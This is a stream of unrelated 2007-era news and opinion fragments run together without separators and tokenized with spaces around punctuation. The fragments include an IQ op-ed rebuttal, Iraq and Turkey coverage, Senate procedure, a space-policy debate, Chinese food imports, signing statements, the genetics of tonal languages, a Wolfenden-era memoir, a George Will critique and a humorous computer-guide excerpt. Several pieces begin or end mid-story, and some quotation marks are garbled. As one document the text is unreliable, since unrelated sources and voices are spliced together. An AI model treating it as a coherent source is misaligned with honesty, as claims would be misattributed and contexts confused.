For most purposes in daily life , it is OK to quasi-equate intelligence and g , as well as IQ scores andintelligence , but they really are quite different concepts .
IQ scores , across generations , need re-calibrated for valid comparisons .
We have ways that do this very well ( latent trait models ) , that have very sound theory behind them .
You have to periodically re-calibrate your bathroom scale , and you have no question about what it is measuring ; why should IQ be any different ?
As a side note , this phenomenon is not at all confined to IQ tests , and it has been known about in the psychometric literature for decades , although it is called item parameter drift there .
Moreover , just because there is no consensus as to why cross-generational scores tended to rise in the mid-twentieth century , this does nothing to invalidate the validity of interpreting IQ scores within a generation .
Brooks is telling all parents of children who have Mental Retardation or Borderline Intelligence that their children 's low cognitive ability is a direct result of parental inadequacy .
If these parents would love their children more , the Mental Retardation would go away .
If I were king , I would mandate that any person with the gumption to make asinine statements like this do two things ( a ) read Spitz 's chef d'oeuvre , and ( b ) spend a week with a family who have a child diagnosed with Mental Retardation .
Not just a daily visit , but an in vivo experience .
Then get back to me about how easy it is raise the cognitive ability of people with mental retardation .
By the way , Turkheimer 's studies look at the ability of the environmental variance to modify heritabilty estimates .
Specifically , people who grow up in more impoverished environment have a more variable environments , which , almost by definition , decreases heritability estimates .
This is a very long cry from showing " growing up in poverty can affect your intelligence for the worse " .
What ?
A few paragraphs ago general intelligence existed , now it does n't ?
Anyway , it is an awful shame when everyday experience does not map onto what data tell us : Beth Visser recently ( gasp ! ) gathered data to test Gardner 's theory .
What did she find ?
Basically what John Carrol said she would find a decade ago : these multiple intelligence all positively correlate ( sans kinesthetic intelligence ) and a strong g factor can be extracted when the measures are factor analyzed .
I wish I had the luxury of being able to write blatantly false statements in a national paper .
There is over 100 years of empirical literature investigating the construct validity of IQ .
There is also 100 years of literature examining what , and how well , IQ scores predict life outcomes .
A simple perusing of Jensen 's g factor or Brand 's g factor ( this one is even available for free ! ) would have sufficed here ; but who wants data to interfere with a good opinion ?... and you can read books about journalism in which the subject of sophism barely comes up .
Namely because the books are concerned about journalism , not logical arguments .
Why would a cognitive scientist who is writing a book about attention necessarily include a chapter about intelligence ?
As a rule , cognitive scientists tend to be concerned with general processes , not individual differences .
The field can learn much from each other , but they are concerned about very different areas of investigation .
By all means , lets infer from one person with severe brain damage to the entire population .
But if we want to play this game , I had a patient once who had just started Kindergarten , but could do addition , subtraction , multiplication and long division ( the latter of which he deduced how to do pretty much on his own ) .
He did not need a school to teach him any of this , so lets get rid of elementary schools for everyone .
After all , if my patient could figure out long division , so should every other 5 year old .
Harvard never was a bastion for the study of general intelligence .
It was the University of London .
In fact , except for Yerkes , Herrnstein , and , to some extent , Pinker , I can't think of too many profs .
there who contributed much to the study of general intelligence .
And since when did Harvard 's Psychology department become the measuring stick by which the importance of a research agenda was measured ?
I 'm sure much of the work they do there furthers the general field of psychology , but what makes their research more special than , say , Berkeley , Stanford , UT - Austin , etc . ?
This paragraph is quite confusing , perhaps due to the mixing of automotive and ballet metaphors .
I think Brooks is trying to tell his readers he thinks personality is important for modern culture .
I agree .
And that has absolutely no bearing on the importance ( or lack thereof ) of cognitive ability in the same culture .
What ?
First , psychometrics ( and specifically , the study of cognitive ability ) has always held as paramount the uniqueness of the individual .
Second , how has the study of cognitive ability NOT shown the complexity of humanity ?
Sir Cyril Burt , one of the pioneers in the field , was enamored with the complexity of students he encountered while a school psychologist in London .
In fact , he was such an ardent supporter of psychological measurement so that he could begin to quantify , and , ultimately , understand and predict , this variability ( see a bibliography here ) .
More modern techniques , such as fMRIs , extend the work of psychometrics , in that they add to our ability to quantify individual variability at a much more precise level .
However the two are quite complementary .
From here
In the world of academia , to have your ideas printed in a reputable journal , you have to go through the peer - review process .
While there are arguments for the pros and cons of this process , at least it frequently squashes ill - informed , blatantly false propaganda from reaching the masses .
After reading op - ed like this , one wishes the NYT had a similar mechanism in place .
In his September 14 , 2007 op - ed piece in the New York Times , David Brooks tells his impression of the latest research in cognitive ability .
Unfortunately , he not only misses the forest , but he bungles a few trees as well .

BAGHDAD ( Reuters ) - Five U.S. service members were killed when a military transport helicopter crashed during a routine flight west of Baghdad , the U.S. military said .
The CH - 47 Chinook helicopter crashed near the U.S. military ’s al - Taqaddum air base close to Falluja , 50 km ( 30 miles ) west of Baghdad .
Turkish - American relations are in crisis .
But the House resolution declaring the World War I - era killings of Armenians a genocide is only one cause -- and that ’s just a sideshow .
Turkish - American relations have been deteriorating for years , and the root explanation is simple and harsh : Washington ’s policies are broadly and fundamentally incompatible with Turkish foreign policy interests in multiple arenas .
No amount of diplomat - speak can conceal or change that reality .
Count the ways :
* Kurds .
U.S. policies toward Iraq over the last 16 years have been a disaster for Turkey .
Since the 1991 Gulf War , the Iraqi Kurds have gained ever - greater autonomy and are now on the brink of de facto independence .
Such a Kurdish entity in Iraq stimulates Kurdish separatism inside Turkey .
Furthermore , Washington supports Kurdish terrorists against Iran .
* Terrorism : Turkey has fought domestic political violence and terrorism for more than 30 years -- Marxist , socialist , right - wing nationalist , Kurdish , Islamist .
U.S. policies in the Middle East have greatly stimulated violence and radicalism across the region and brought Al Qaeda to Turkey ’s doorstep .
* Iran : Iran is Turkey ’s most powerful neighbor and a vital source of oil and gas -- second only to Russia -- in meeting Turkey ’s energy needs .
Washington heavy - handedly pressures Turkey to end its extensive and deepening relations with Iran in order to press a U.S. sanctions regime there .
Though there is little affection between Turkey and Iran , there has been virtually no serious armed conflict between the two nations for centuries .
Ankara sees U.S. policies as radicalizing and isolating Tehran further , which is undesirable for Turkey .
* Syria : Ankara ’s relations with Syria have done a 180 - degree turn in the last decade , and relations are flourishing .
Syrians -- as well as many other Arabs -- are impressed with Turkey ’s ability to simultaneously be a member of NATO , seek entry into the European Union , say no to Washington on using Turkish soil to invade Iraq , restore respect for its own Islamic heritage , develop new relations with the Arab world and adopt a genuinely balanced position on the Palestinian conflict .
Ankara resists Washington ’s pressures to marginalize and stifle Damascus .
* Armenia : Ankara and Yerevan , Armenia ’s capital , are actually in productive unofficial contact with one another , such as via “ gray ” trade and air links , and both would like to effect a reconciliation .
It is the Armenian diaspora , with its intense nationalist rhetoric , that is one of the key factors in inflaming the atmosphere against potential rapprochement .
* Russia :
There has been a revolution in Ankara ’s relations with Moscow after 500 years of hostility .
Moscow is today the second - largest importer of Turkish goods after Germany , and Turkey has invested up to $ 12 billion in Russia in the construction field .
Russia is Turkey ’s primary source of energy , and Ankara increasingly looks to Eurasia as a key part of its economic future .
Turkish generals , angry with Washington , even mutter about a Russian strategic “ alternative ” if it is stiff - armed by the West .
Although there is some rivalry over the routing of Central Asian energy pipelines to the West -- whether via Russia or Iran and Turkey -- Ankara values its ties with Moscow and opposes U.S. efforts to bait the Russian bear in the Caucasus and Eastern Europe on NATO expansion and missile issues .
* Palestine : Turks care a lot about Palestine -- which they had jurisdiction over in Ottoman times .
They sympathize with Palestinian suffering under 40 years of Israeli occupation .
Ankara views Hamas as a legitimate and important element on the Palestinian political spectrum and seeks to mediate with it .
Washington says no .
Ankara has good working ties with Israel but does not shrink from sharp public criticism of what it perceives as Israeli excesses .
Overall , a “ new Turkey ” actively seeks good - neighbor relations with all regional states and players .
It seeks to be a major player and mediator in the Middle East -- to bring radicals into the mainstream via patient diplomacy against what it perceives as Washington ’s complicating belligerence .
Turkey has deep interests in Central Asia .
If the Chinese - Russian - sponsored Shanghai Cooperation Organization bids to be the dominant geopolitical grouping in Eurasia , then Turkey , like Afghanistan , Iran and India , would like an association with it .
Washington opposes that .
One may quarrel with the specifics of Turkish policies , but there is broad belief across the Turkish political spectrum that these policies serve the country ’s core needs .
While the State Department may soothingly speak of “ vital shared interests ” in democracy , stability and counter - terrorism , all of that is mere motherhood and apple pie -- empty phrases -- when compared with conflicting concrete policies in so many key spheres .
We had better get used to the fact that Turkey , strengthened by its popular democracy , is going to pursue its own national interests , regardless of Washington ’s pressure .
Few Turks want it any other way .

On the Senate floor a few moments ago , Sen. Harry Reid challenged the Republicans to decide : are they going to continue to protect the president , or are they going to protect the troops ?
Reid is making the very generous offer that Cornyn's " side - by - side " legislation , the GOP " version " of Levin / Reid be offered an up or down vote , as long as Levin / Reed also get that simple majority vote .
To do this , he just announced on the Senate floor that he 's invoking cloture on the Reed - Levin troop redeployment bill and , if the Republicans filibuster it tomorrow , he 's going to force the Senate into an all - night session -- with cots brought in and everything -- to make them stand up in public for their beliefs .
Unless they agree to a simple - majority vote on Reed - Levin , the Senate stays in ongoing session .
Bob Geiger has the details :
In making this move ( based on my understanding of Senate rules ) , Reid is invoking the provisions of Rule 22 ( Precedence of Motions ) of the Standing Rules of the Senate , which provides , at the Majority Leader 's discretion , up to 30 hours of debate if a filibuster is initiated -- as the Republicans will most certainly do , knowing that Reed - Levin may very well have the 51 votes needed for passage .
Sixty votes are needed to achieve cloture ( end debate ) and move legislation to a full , deciding vote .
Reid will be using the provision of Rule 22 that allows for up to 30 hours of continuous debate once it's made clear -- in this case , by Republicans trying to avoid an up - or - down vote on Reed - Levin -- that there is a desire to continue debating the issue .
In other words , the Majority Leader is saying " You want to debate ?
We 'll stay all night and debate . "
Senate Democrats are prepared to speak all night and to force Republicans to stay in the chamber by invoking ongoing quorum calls .
This is theatrics , yes , but it 's theatrics to bring to light the ongoing efforts by the Republicans to block any and all efforts to force a change of policy in Iraq .
Today , Hickam and Simberg watch the moon and the Red Planet for signs of human life .

Infinity is not the place for zero - sum thinking
By Rand Simberg
Homer , yesterday we at least reached a consensus on why we should have a national space program , if not on who should be funded to implement it , or with whose funds .
If we agree that the ultimate purpose is to utilize the resources off - planet , and expand humanity ( and hopefully , the human values of freedom and prosperity ) into that realm , then the question arises : “ Off planet ” is a big place  where should we go first ?
In the wake of the Columbia loss almost five years ago , many thought that it was important for the president ’s new space policy to include a destination in order to break us out of the merry - go - round in which we ’ve been circling the planet only 200 miles above the surface for the last third of a century , since the end of Apollo .
He did this , in naming “ the moon , Mars and beyond , ” but it set off a debate in the space community about whether or not there was any value in going to the moon first , or at all .
The main objections were from the Marsophiles , many of whom consider the Red Planet the only interesting place in the solar system , at least in terms of its potential for human habitation , and lunar excursions a pointless diversion from that goal .
( They apparently ignore the issue that its potential for life , and possibly non-Earthly life , is one of the things that makes it interesting , and that if it ’s discovered there , the entire planet may be quarantined from contamination by terrestrial life , in the interest of environmental preservation . )
Of course , this just demonstrates that , just as is the case with terrestrial travel planning , where we want to go depends on what we want to accomplish , and what financial and technical resources are available to us .
If I want to gamble , and there are cheap fares to Vegas , the solution is pretty obvious .
It ’s not so obvious for space destinations , though , partly because , as a result of ( correctly or otherwise ) perceived high costs and the associated perception of the need for government funding , it continues to be viewed as a collective endeavor .
If we have to jointly plan a vacation , and I want to hit the Strip , and you want to mellow out in Myrtle Beach , we may have an irreconcilable difference .
But when it comes to space , let ’s assume for a minute that I ’m doing the travel planning , and poor Homer has to ( no doubt grumpily , or at least that would be the case for me ) come along for the ride .
Me ?
I want to do things that make it as cheap to get to as many , and many kinds , of places as possible , as soon as possible .
As long as we continue to use chemical rockets ( and even if we sensibly start to develop nuclear ones ) that rely on reaction mass for propulsion , I think that we ought to be scouting out and finding sources of propellants ( and energy ) that do n’t have to be hauled up , at great expense , out of the deep gravity well of our home planet .
So I ’d be heading for places that have high prospects for processable fuel sources and low energy requirements to get to them .
Based on our knowledge right now , that means ( perhaps ) the moon , which may have ice at the poles that can be converted to liquid - oxygen / liquid - hydrogen propellants , but perhaps even better , near - Earth objects that may be dead comets made of ice , or carbonaceous materials that would contain the elements that would allow the manufacture of other fuels , such as methane or propane .
Exploiting near - Earth objects would have the additional benefit of helping us learn how to reliably divert them , should any of them be on an impact course for our precious home world , with the threat of delivering unto us a fiery blast with a long winter thereafter  the probable fate of the dinosaurs ( which , it must be noted , having brains the size of a grape , did n’t have a space program of any sort , other than perhaps dumbly watching the approaching fireball ) .
They ’re also a lot easier to get to than the moon , though the trip time is longer .
In addition to that , I ’d also be developing means of gathering large amounts of power in space and learning to beam it to vehicles in space for propulsion , and perhaps to the ground , to provide clean power .
We should also be harnessing the almost limitless energy of the sun for Earth .
But I understand that others may have other priorities ( and you may as well , Homer  we ’ll find out in your response ) .
But see , that ’s the beauty of my priorities .
My priorities make it possible for everyone to get a pony , as long as they ’re not into immediate gratification .
If we focus our resources on those things that allow us to build on them to do other things , then I can afford to use my space transport ticket to go to the Wynn ’s Lunar Casino , while you can use yours to go to the beach resort ( under the dome , of course , until we get that pesky terra - forming thing down ) on the slopes of Olympus Mons .
And we wo n’t have to reach a “ consensus , ” because , like travel planning on Earth , it will be up to individuals , not the collective .
I used to have a signature on Usenet that said , “ It ’s not NASA ’s job to send a man to Mars .
It ’s NASA ’s job to make it possible for the National Geographic Society to send people to Mars . ”
Despite the fact that the agency wants to go back to the future with “ Apollo on steroids , ” and has almost , by administrator Mike Griffin ’s own admission , put itself out of the advanced R&D business , I still believe that .

Great , good , happy moon people
Homer Hickam
Well , that ’s quite the space shopping list , Rand , and I ’m glad you ’re dreaming big , but I think you ’re getting a little ahead of yourself .
If we hold out for your wonderful schemes , I ’m afraid we ’ll be holding out for a very long time , and by that I mean pretty much forever .
First things first , my boy , and by that I mean the moon .
You see , I think the moon may very well be our country ’s salvation .
The sad truth is that the United States  let ’s face it  has not lived up to its potential in the 50 years since Sputnik , at least according to the expectations of the kids who were so excited about the future back then .
Somewhere along the line , we decided we did n’t want to do much in space ( I missed that vote , but I ’m sure there must have been one ) .
We also decided we were too good to be an industrial country and voted to let the Chinese and other countries build all our stuff ( I missed that vote , too ) .
What kind of country just recycles its old money , reminisces about what used to be and does n’t know how to weld , to machine , to cast or to bolt things together ?
Not one that ’s on a path to future greatness , that ’s for certain .
There are many countries that want to vault over us , that just ca n’t wait until we ’re No. 2 , then No. 3 , then no number at all .
The barbarians may not be at the gate , but they built it and know the combination of the lock .
So we ’d better get a better plan than what we ’ve got , or we ’re going to find ourselves on the same dump as the Soviet Union .
So my plan , Rand , my solution , my hope for my country and its people lies with the moon .
Not Mike Griffin ’s “ Apollo on steroids , ” although that ’s a start .
I have a grander scheme .
I want to make the conquest of the moon the United States ’ goal for the 21st century , and through that goal to make us a great and good and happy country for generations to come .
To be a great nation and a great people , you have to do great things .
Currently , we are both , thanks to what previous generations have done , but there is really nothing we ’re doing now that would qualify .
Many people thought that ’s where we were back in the early 1960s too .
We were just going along with no plan , a people adrift .
John Kennedy saw that and decided to do something about it .
Everyone remembers him saying “ we choose to go to the moon ... and do the other things , not because they are easy , but because they are hard . ”
That was bold and eloquent and inspiring , but these days too many people think it was just Cold War rhetoric .
I do n’t think so , mainly because of what JFK said immediately afterward .
He said we were going to the moon “ because that goal will serve to organize and measure the best of our energies and skills . ”
Do you think he just said that because it sounded good ?
I do n’t .
I think Kennedy got it right then , and he ’s still right .
We need something as grand and glorious as going to and staying on the moon as a goal to keep us working together , to give our kids a reason to learn the hard things in school like math and science and to provide us with a national purpose while also keeping active our industrial base .
President Kennedy did n’t say it because he thought he did n’t have to , but I will .
For a country like ours that needs to stay ahead of the world or go under , we must do great , ambitious things like going to the moon to survive .
So let ’s do it , Rand .
Let ’s build moon stations similar to those we have in the Antarctic , with somewhat similar goals : scientific knowledge , national pride and a sense of duty to our planet .
And once we ’re committed to staying , we ’ll start finding better ways to go , and more reasons to keep going , and then maybe we can even get around to your dreams in space .
But even if we do n’t , we ’ll be making stuff again , new stuff , stuff we ca n’t even imagine !
And , oh , the things we ’ll learn about ourselves along the way !
We ’ll be great again .
And good .
And happy .
If we do n’t , we wo n’t be any of those things .
This I believe .

No fatalities or serious injuries from Chinese food products have been reported in the United States , although counterfeit Chinese glycerine has been linked to at least 100 deaths in Panama .
In May , senior members of the Bush administration , including the secretary of agriculture , Mike Johanns , raised the food safety issue with Chinese officials during trade talks in Washington .
And last week , in a step designed to reassure Western customers , the Chinese government said it had closed 180 food plants and identified 23,000 safety violations .
Although they affect only a fraction of imports from China , the rising tempo of alerts , including an F.D.A. restriction imposed on Thursday on sales of five types of Chinese - farmed seafood , has called attention to China ’s sudden emergence as a major agricultural exporter .
Between 2002 and 2006 , F.D.A. - regulated imports of food from China rose from just over 100,000 shipments to nearly 235,000 .
Experts predict those shipments will reach 300,000 this year .
The spate of recalls and the rising volume of exports have highlighted another worry : the increasing dependence of the United States ’s biggest food manufacturers on China for basic additives like apple juice , a common sweetener , and preservatives like ascorbic acid .
These little - known additives form the building blocks of many popular staples in American kitchens , keeping fruit from turning brown or providing the sweetness in breakfast bars .
Food experts note , for example , that China supplies more than half of all the apple juice imported to the United States , up from a fraction a decade ago .
Other critical but common additives have followed an even sharper trajectory , according to Peter Kovacs , the former chief executive of NutraSweet Kelco and now a food industry consultant .
More than 80 percent of ascorbic acid , better known as vitamin C and also used as a preservative , comes from China , Mr. Kovacs said .
Chinese imports of xanthan gum , used to thicken dairy products and salad dressings , account for at least 40 percent of United States consumption .
“ This is a problem for the whole food chain , but it was a blank spot , ” Mr. Kovacs said .
“ They ’re doing it now , but companies were n’t testing these additives before . ”
Although Kellogg and General Mills disclosed these additional steps , they were reticent to provide additional details .
And many food makers are nervous to discuss what is emerging as an issue that could threaten the trust of shoppers in long - established brands .
Report : GOP Senator seeks to limit presidential signing statements RAW STORY

The top Republican on the Senate Judiciary Committee quietly reintroduced a bill before Congress recessed last week aimed at reining in President Bush 's ability to modify laws to his whims , Roll Call reports .
Critics and watchdog agencies say Bush 's use of signing statements allows him and federal agencies to ignore provisions of the law and Congress 's intent .
Pennsylvania Sen. Arlen Specter called President Bush 's abuse of the signing statements an " unconstitutional attempt to usurp legislative authority . "
He introduced his Presidential Signing Statements Act of 2007 on Friday , according to the Capitol Hill newspaper .
" The president cannot use a signing statement to rewrite the words of a statute nor can he use a signing statement to selectively nullify those provisions he does not like , " Roll Call reported Specter said on the floor of the Senate .
Specter 's bill would prevent the president from issuing a signing statement that alters a statute 's meaning by " instructing federal and state courts not to rely on presidential signing statements in interpreting a statute , " Roll Call reported .
His measure also would give Congress a heightened role in court cases involving an interpretation of law in an existing statement by allowing Congress to file briefs and present oral arguments in the cases .
The Government Accountability Office found in mid-June that in several cases the administration did not execute laws as Congress intended when Bush attached a signing statement to them .
ï¿½This is a finely structured constitutional procedure that goes straight to the heart of our system of check and balances , ï¿½ Specter said , according to Roll Call .
ï¿½Any action by the president that circumvents this finely structured procedure is an unconstitutional attempt to usurp legislative authority .
If the president is permitted to rewrite the bills that Congress passes and cherry - pick which provisions he likes and does not like , he subverts the constitutional process designed by our framers .ï¿½
FIVE years ago three well - known academics , including Noam Chomsky , wrote that the half - century old “ interdisciplinary marriage ” between biology and linguistics “ has not yet been fully consummated . ”
That same year other scientists described the molecular evolution of a gene called FOXP2 which , when mutated , seems to cause people severe difficulty with grammar and articulation .
Another genetic condition that could shed light on the biology of linguistics is microcephaly ( sometimes rudely called “ pin-headedness ” ) .
It is linked to six genes , a spanner in the works of any of which leads the human brain to grow to only two - thirds of a pint in adults .
That is less than a third of its normal volume .
Those genes are alluring objects for studying the evolution of language because brain size has ballooned in people since their line split with that of their closest relatives .
Even though birds sing and bees dance , nothing in nature matches a human 's richly complicated system of vocal communication .
In short , language makes humans unique and genes active in the developing brain make language possible .
Dan Dediu and Robert Ladd , of the University of Edinburgh , are helping biology and linguistics become intimate at the genetic level .
In the current issue of the Proceedings of the National Academy of Sciences they describe a statistical analysis of two of the genes that cause microcephaly when they go wrong .
Like many genes , both exist in different functional versions , called alleles , which are spread unevenly among human populations .
First , Dr Dediu and Dr Ladd checked that their two genes of interest really are unusual .
They combined a database of 983 alleles that are known to vary across human groups with another enumerating how 26 discrete linguistic features ( such as whether consonants aggregate at the beginnings and ends of words ) are either used or not used in conversation by 49 populations .
Picking apart a thicket of possible correlations , Dr Dediu and Dr Ladd found no general links between human genetic and linguistic characters .
But one feature — whether a language uses pitch as well as vowels and consonants to convey word meanings — stood apart .
Those , such as Chinese , that encipher meaning in pitch are called “ tonal languages ” .
Those that do not , like English , are “ non-tonal ” .
And it was versions of Dr Dediu 's and Dr Ladd's two microcephaly - related genes that matched the 49 populations along tonal and non -tonal lines .
Dr Dediu and Dr Ladd believe the evolution of tonal and non-tonal languages interacted with the evolution of these genes .
Certain alleles could have predisposed people to a tonal - language structure .
That tonal language , if used by individuals with whom communicating well is particularly helpful , could then reinforce selection for those alleles .
Probably not coincidentally , the two alleles that are associated with non-tonal languages evolved recently in human history ( some 5,800 and 37,000 years ago ) and show signs of being strongly beneficial to their carriers .
Correlations such as these can shift the balance of evidence , but it is demonstrating causation in addition to correlation that forms the glue of the scientific method .
Here the marriage between language and genetics hits a problem .
No suspicious - looking gene can be added or eliminated in an experimental mouse in order to discover its effects on language , since mice cannot speak .
At best , researchers can try to fill in gaps between molecular biology and behaviour .
In March , Narly Golestani and her colleagues at University College , London , showed that people who are fast at learning the sounds of foreign speech have more densely packed white matter in a part of the brain called the left Heschl gyrus .
Patrick Wong and his colleagues at the University of Texas , Austin , recently found that adult English speakers fall into two groups , according to their ability to learn tonal distinctions .
The more successful also had bigger left Heschl gyruses .
The next task is to see if genetic differences can be pinned on the two groups — and , if so , exactly which genes are involved .

In September 1957 , when the Committee on Homosexuality and Prostitution made public its findings and recommendations , known as the Wolfenden report , I 'd arrived at Indiana University to begin graduate studies .
The university 's Bloomington campus was then best known for the Kinsey Institute for Sex , Gender and Reproduction .
Its founder and head , Dr Alfred Kinsey , the zoologist turned sexologist , had recently died .
The institute rightly claimed responsibility , through its seminal 1948 and 1953 Reports on the Sexual Behaviour of the Human Male and the Human Female , for creating the climate of opinion that led to the part of the report recommending that sexual activity between consenting males in private should no longer be a criminal offence .
A meeting was held to discuss the recommendations , about which I reported to one of my closest friends , Sir John Wolfenden 's gay son , Jeremy .
Somewhat naively , I believed that legislation would soon follow .
But Jeremy , who after graduation from Oxford that summer had started full - time work at the Times , wrote to tell me about the hostile response of the British press and politicians .
Years would pass , he opined , before anything was done .
He was right .
By then , Jeremy , who was godfather to my eldest son , had drunk himself to death .
He died in December 1965 while in Washington as the Daily Telegraph correspondent .
For a while , rumours circulated that he was the victim of the CIA , the KGB and / or our SIS .
A play by Julian Mitchell about Jeremy 's life and relationship with his father , in which there 's a character loosely based on me , will be broadcast on BBC4 in September .
I first met Jeremy , widely regarded as one of the most brilliant men of his generation , in 1954 , a year that was a turning point in my life .
During the first five months of that year , I was completing my national service as a second lieutenant in an infantry regiment in Egypt .
In that world , devoid of women , homosexuality was mocked , castigated and feared .
The chief topic of amused conversation in the officers ' mess was the trial of Lord Montagu of Beaulieu , Michael Pitt - Rivers and journalist Peter Wildeblood for having sexual relations with two aircraftsmen who had informed on them to the RAF police to protect their skins .
All three were humiliated and jailed .
Little sympathy was shown them .
I was deeply impressed when I read that 26 - year - old Ken Tynan , recently appointed theatre critic of The Observer and a writer I much admired , had risked public obloquy by standing bail for Wildeblood .
Returning to civilian life in May , I spent four months working in a Bristol car showroom seething with prejudice of every kind : sexual , racial , political .
I became aware I was living in an era of repression and that pressure from the House Un- American Activities Committee , the State Department and the FBI was being brought to bear on the Home Office of Sir David Maxwell - Fyfe , one of the worst Home Secretaries in living memory , who , to allay critics , had appointed the Wolfenden Committee that year .
There were much publicised attacks on homosexuals .
American fugitives from McCarthyism were being harassed by MI5 and the Special Branch .
Books from reputable publishers were prosecuted for obscenity , though in most cases they were acquitted .
My scepticism about society and my newfound libertarian attitudes were fuelled by an army friend who'd introduced me to anarchism .
Going up to Oxford in October , I discovered ( alongside conventional thinking , snobbery and crude prejudice ) a refreshing world of intellectual freedom and social tolerance .
For the first time , I met men who were openly gay , a term not used then , and a few who were straight but affected camp mannerisms to give themselves style .
What I knew about homosexuality at the age of 21 came from playground folklore , the ignorant talk of my parents ' lower - middle - class circles , barrack - room chat , the News of the World and books .
I knew that a good many people I admired , from Oscar Wilde and Noel Coward to WH Auden and Christopher Isherwood , were gay .
But apart from rumours about schoolteachers , scoutmasters and RAF parachute instructors , I had no direct experience of homosexuals .
At Oxford , I came to enjoy the company of a good many and thought them victims of a grave injustice .
From my first term , Jeremy Wolfenden became a special friend .
We worked together on the student magazine Isis for two years .
When he edited Isis , I wrote an article , partly occasioned by Peter Wildeblood 's autobiography , on the absurdity of the laws relating to personal sexual conduct and the deformities they afflicted on us all .
Jeremy encouraged me to write it as a way of directly addressing his father .
For my inaugural editorial in April 1956 , I nailed my libertarian colours to the mast by choosing to write about 1954 as a year of shame .
Not that this changed much .
The Lord Chamberlain routinely refused to license serious plays touching on homosexuality .
In 1956 , there were so many American plays banned from public performance for this reason ( A View From the Bridge , Tea and Sympathy , Cat on a Hot Tin Roof ) , that the Comedy Theatre in the West End was turned into a club so they could be presented .
It took courage in that moral climate for a star like Dirk Bogarde - gay , but going to his grave without coming out - to appear in the 1961 thriller Victim ( pictured below ) , which was , in effect , a demand for the implementation of Wolfenden .
The Lord Chamberlain 's authority to license plays was finally abolished in 1968 , the year after Wolfenden 's implementation , and I recall a curious incident from that time .
In 1966 , I produced the BBC Home Service 's Sunday lunchtime show , The Critics , and received the index file that recorded comments on contributors ' performances .
At the top of a fair number of cards were red asterisks , some accompanied by question marks .
It suddenly dawned on me that the mark signified that someone was gay or possibly gay .
I did the only thing I could do .
I got a pen and put a red asterisk on every card .
Wanted : A New Conservatism
May 31 , 2007
George F. Will , spokesman for the hence - thus - indeed coffee - table school of conservatism , whose utterances seem meant to sound like old translations from some august language , has once more done what he does best : set my teeth on edge with yet another pronouncement on what the contemporary conservative position ought to be .
In recent weeks Will has all but endorsed Rudy Giuliani ( whom else ? ) for president and ridiculed Ron Paul , who takes the U.S. Constitution seriously , as an anachronism .
I imagine he slapped his flippers together in glee when Giuliani attacked Paul for saying the obvious , that the 9/11 attacks were motivated by American foreign policy , rather than by virginal American innocence .
Paul might have been speaking for Jefferson , Madison , and Hamilton , men to whom Giuliani would have little to say , unless he could say it with his middle finger .
Hence , according to Will , conservatives thus should insist indeed that  the argument about whether there ought to be a welfare state is over . 
I dont know what he reads , but within the last hour ( several hours after I read that sentence ! )
I saw a review of a new book arguing that the welfare state should be done away with .
Hence , thus , and indeed my foot .
Where does the Constitution authorize any such thing ?
How does
Will square the mammoth Federal welfare state with anything in The Federalist Papers , where the Federal powers are said to be few and defined ?
Well ,
Will has also declared the Tenth Amendment to be dead as a doornail ,  so maybe anything written two centuries ago is now defunct under the Living Document doctrine .
Or is the whole darned Constitution subject to some statute of limitations ?
As long as there are men like Will asserting that all is well with the present system , there will be need of other men to contradict them .
The word conservative is vain unless you can define what most needs to be conserved , because most things are bound to perish .
Case in point : I have to move from my old house to a small apartment this week .
I own well over 10,000 books .
I can fit about a fifth of them into my new place .
That means I face thousands of choices , many of them painful .
Conservatism is like that .
You have to keep making hard choices .
Thats why Im a little startled when anyone calling himself a conservative starts by deciding that the Constitution , or any of its key provisions , can be thrown out with the rubbish .
You expect it of a party hack like Giuliani , of whom it would be flattery to say that crassness is second nature to him , when he manifestly knows no other .
He calls killing children in the womb a constitutional right .
But George
Will should know better .
Has he forgotten his own arguments ?
The truncated , perverted version of conservatism now called neoconservatism in the media is conservative only in the sense that sodomy is sex .
The real thing can be found in the American Founders and , in England , in the writings of such men as Samuel Johnson , Edmund Burke , John Henry Newman , and C.S. Lewis .
What American conservatism needs now can be summed up in a single word : purification  an inward regeneration , without the slogans and gimmicks of the last few decades  supply - side economics , term limits , and all the other familiar but desperate substitutes for simple principle .
We are all bored and jaded with these by now .
The change will have to come from young people who , without being zealots , refuse to compromise as their elders have .
We need a pacific patriotism that doesnt confuse war with  defense ,  welfare with  compassion ,  or the sheer multiplicity of arbitrary ( and even criminal ) powers with the rule of law .
These are all lies that may be brushed aside , and the sooner the better .
The old conservatism has had its day , and it has failed as dismally as the old liberalism .
Even some of the old conservatives are finally starting to realize that .
As the Federal Government spends trillions of dollars per year , mostly borrowed or virtually counterfeit , the compromises of the last few generations are bound to buckle and collapse .
Start with a simple question :
How would honest Americans be worse off if the Federal Government , in its present form , just ceased to exist ?

I happened upon Russ Walter 's Secret Guide to Computers around 1993 .
By then it was already up to the 18th edition .
The first version of The Secret Guide was published in 1972 as a self - typed 17 page pamphlet .
The latest edition is a hulking 607 - page monster , a rambling , zine - like love letter to the computer , in all its manifestations and permutations .
Russ alternately compares computers with drugs :
Computers are like drugs : you begin by spending just a little on them but soon get so excited by the experience -- and so hooked -- that you wind up spending more and more to feed your habit .
Your first computer experience seems innocent : you spend just a little money for a cute little computer .
You turn the computer on , tell it to play a game , and suddenly the computer 's screen shows dazzling superhuman colors that swirl hypnotically before you .
You say " Wow , look at all those colors ! " and feel a supernatural high .
But after two months of freaking out with your new computer , the high wears off and you wonder , " What can I buy that 's new , exciting , and gives me an even bigger high ? "
So you buy more stuff to attach to your computer .
Now you 're in really deep , financially and spiritually .
You 're hooked .
You 've become addicted to computers .
Each month you return to your favorite computer store to search for an even bigger high -- and spend more money .
Look at me .
I 'm a typical computer junkie .
I 've already bought 50 computers , and I 'm still going .
Somebody help me !
My computers have taken over my home .
Whenever I try to go to sleep , I see those computers staring at me , their lights winking , tempting me to spend a few more hours in naughty fun , even if the sun 's already beginning to rise .
.. and sex :
The computer will fascinate you .
It 'll seduce you to spend more time with it .
You 'll fall in love with it .
You 'll start buying it presents : exotic foods ( expensive programs to munch on ) , new clothes ( a pretty little cloth cover to keep dust off ) , and expensive jewels ( a printer and extra disks ) .
Then the computer will demand you give it more .
While you enjoy an exciting orgy with your computer and think it 's the most joyous thing that ever happened to you , suddenly the computer will demand you buy it more memory .
It 'll refuse to continue the orgy until you agree to its demand .
And you 'll agree -- eagerly !
The computer 's a demanding lover .
You 'll feel married to it .
Marrying a computer is much groovier than marrying a person : computers are good at " getting it on " ( they make you feel all electric and tingly ) and they never argue ( they 're always ready to " do it " , except when they " have a headache " ) .
I wanted to call this book " The Sexual Guide to Computers " and put a photo of my computer wife and me on the cover ; but some communities still prohibit mixed marriages .
